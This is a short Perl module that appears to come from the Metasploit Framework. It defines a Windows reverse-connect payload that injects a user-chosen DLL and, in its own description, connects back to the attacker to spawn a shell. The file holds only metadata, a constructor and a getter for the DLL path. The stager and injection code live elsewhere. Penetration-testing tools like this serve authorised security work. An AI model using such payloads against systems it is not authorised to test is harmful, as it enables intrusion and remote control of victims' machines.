package Msf::Payload::win32_reverse_dllinject;
use strict;
use base 'Msf::PayloadComponent::Win32InjectLibStage';
sub load {
  Msf::PayloadComponent::Win32InjectLibStage->import('Msf::PayloadComponent::Win32ReverseStager');
}

my $info =
{
  'Name'         => 'winreverse_dllinject',
  'Version'      => '$Revision$',
  'Description'  => 'Connect back to attacker and spawn a shell',
  'Authors'      => [
                        'Jarkko Turkulainen <jt@klake.org> [Unknown License]',
                        'Matt Miller <mmiller@hick.org> [Unknown License]'
                    ],
  'UserOpts'     => { 'DLL' => [1, 'PATH', 'The full path the DLL that should be injected'] },
                
};

sub new {
  load();
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHash($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);
  return($self);
}

sub _InjectDLL {
  my $self = shift;
  return $self->GetVar('DLL');
}

1;